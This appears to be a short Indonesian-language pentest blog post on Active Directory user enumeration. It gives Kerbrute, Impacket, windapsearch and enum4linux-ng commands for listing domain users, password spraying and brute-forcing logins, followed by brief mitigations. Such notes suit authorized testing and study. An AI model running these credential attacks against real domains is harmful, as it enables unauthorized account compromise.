---
title: Part 2 - User Enumeration
date: 2022-02-05 08:35:22 +0800
categories: [Active Directory, Initial Attack Vector]
tags: [active directory, windows, kerbrute, impacket, enumeration]     # TAG names should always be lowercase
author:
  name: Nairpaa
  link: https://nairpaa.github.io
---

### Tujuan 

- *Get a foothold user*

### Prasyarat

- Memiliki akses ke RPC, atau
- Memiliki wordlist username


### Tools

- Kerbrute
- Impacket
- windapsearch

---

## Tahap eksploitasi

### User Enumeration

```bash
# kerbrute
➜ kerbrute userenum -d <domain> --dc <ip-dc> userslist.txt

# impacket, jika SMB/RPC bisa diakses
➜ lookupsid.py anonymous@<ip-dc>

# windapsearch
➜ windapsearch -m user -d <domain> --dc <ip-dc>

# enum4linux-ng
➜ enum4linux-ng -A <ip-dc>
```

### Password Spray

```bash
# kerbrute
➜ kerbrute passwordspray -d <domain> --dc <ip-dc> domain_users.txt <password>
```


### Brute User

```bash
# kerbrute
➜ kerbrute bruteuser -d <domain> passwords.txt <user>
```

### Brute Force

Langkah-langkah:
1. Buat kombinasi username dan password dengan format `username:password`.
2. Jalankan perintah berikut:

```bash
➜ cat combos.lst | kerbrute -d <domain> bruteforce -
```

## Mitigasi

- Jangan berikan akses *anonymous* pada RPC.
- Terapkan kebijakan password yang kuat pada setiap pengguna.

## Referensi

- [Kerbrute](https://github.com/ropnop/kerbrute)
- [Impacket lookupsid.py](https://wadcoms.github.io/wadcoms/Impacket-LookUpSID/)
- [windapsearch](https://github.com/ropnop/go-windapsearch)